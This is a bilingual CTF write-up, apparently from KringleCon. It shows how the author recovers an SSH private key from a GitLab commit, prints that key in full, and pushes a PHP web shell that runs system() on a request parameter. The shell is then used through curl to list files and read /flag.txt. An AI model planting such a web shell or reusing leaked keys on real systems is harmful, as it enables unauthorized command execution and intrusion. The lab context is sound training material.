```
git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
```
![image](https://user-images.githubusercontent.com/6504854/209685487-d6be48c2-e8af-4c13-9a96-55332a790dd3.png)

```
cd wordpress.flag.net.internal
git log
```

![image](https://user-images.githubusercontent.com/6504854/209685710-9cda9abb-f15f-44a7-a1b6-db10fc400181.png)

```
git show e19f653bde9ea3de6af21a587e41e7a909db1ca5
```

![image](https://user-images.githubusercontent.com/6504854/209686086-8f03dd2d-aa19-46a9-85df-c933a6cb54e9.png)

```
grinchum-land:~/wordpress.flag.net.internal$ mkdir ../.ssh
grinchum-land:~/wordpress.flag.net.internal$ vi ../.ssh/key
```
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----
```
```
grinchum-land:~/wordpress.flag.net.internal$ chmod 600 ../.ssh/key
ssh -T git@gitlab.flag.net.internal -i ~.ssh/key
```

```
ED25519 key fingerprint is SHA256:jW9axa8onAWH+31D5iHA2BYliy2AfsFNaqomfCzb2vg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'gitlab.flag.net.internal' (ED25519) to the list of known hosts.
Welcome to GitLab, @knee-oh
```

```
grinchum-land:~/wordpress.flag.net.internal$ vi 1.php
```
```
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```
```
grinchum-land:~/wordpress.flag.net.internal$ git config --global user.email "you@example.com"
grinchum-land:~/wordpress.flag.net.internal$ git config --global user.name "Your Name"
grinchum-land:~/wordpress.flag.net.internal$ git add 1.php
grinchum-land:~/wordpress.flag.net.internal$ git commit 1.php -m "cmd"
[main 5387726] cmd
 1 file changed, 6 insertions(+)
 create mode 100644 1.php
```
 
```
grinchum-land:~/wordpress.flag.net.internal$ git push
Username for 'http://gitlab.flag.net.internal': 
Password for 'http://gitlab.flag.net.internal': 
remote: HTTP Basic: Access denied. The provided password or token is incorrect or your account has 2FA enabled and you must use a personal access token instead of a password. See http://gitlab.flag.net.internal/help/topics/git/troubleshooting_git#error-on-git-fetch-http-basic-access-denied
```
IDとパスワードがわからないのでSSH鍵でPUSHする方法を探した

I don't know my ID and password, so I looked for a way to PUSH with my SSH key.

https://docs.gitlab.com/ee/user/ssh.html

```
grinchum-land:~/.ssh$ eval $(ssh-agent -s)
Agent pid 509
grinchum-land:~/.ssh$ ssh-add /home/samways/.ssh/key
Identity added: /home/samways/.ssh/key (sporx@kringlecon.com)
grinchum-land:~/.ssh$ vi config
```

```
Host gitlab.flag.net.internal
    PreferredAuthentications publickey
    IdentityFile home/samways/.ssh/key
```

```
grinchum-land:~/.ssh$ cd ../w*
grinchum-land:~/wordpress.flag.net.internal$
git remote set-url origin ssh://git@gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
grinchum-land:~/wordpress.flag.net.internal$ git remote -v
origin  ssh://git@gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git (fetch)
origin  ssh://git@gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git (push)
grinchum-land:~/wordpress.flag.net.internal$ git push
```

```
grinchum-land:~/wordpress.flag.net.internal$ curl http://wordpress.flag.net.internal/1.php?cmd=ls
1.php
index.php
license.txt
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
xmlrpc.php
```

```
grinchum-land:~/wordpress.flag.net.internal$ curl http://wordpress.flag.net.internal/1.php?cmd=find%20/%20-name%20*flag*.*
```
![image](https://user-images.githubusercontent.com/6504854/209704481-8c9b649f-f049-4058-b1c3-2f2b3d20bc82.png)

```
grinchum-land:~/wordpress.flag.net.internal$ curl http://wordpress.flag.net.internal/1.php?cmd=cat%20/flag.txt
```

普通にReversShellはったら重すぎで動かなかったのでPHPのワンライナー系になった。

要求されてる方向性がわからず、３日かかった。

あとGitLabのレポジトリをHTTPからSSHへ変更するとこで１日はまった。公式ドキュメント神。

I tried to use ReversShell as usual, but it was too heavy and didn't work, so I used a PHP one-liner.

It took me 3 days to figure out how to go the direction.

Also, I got stuck for a all day when I had to change GitLab repository from HTTP to SSH. 

The official documentation is god.

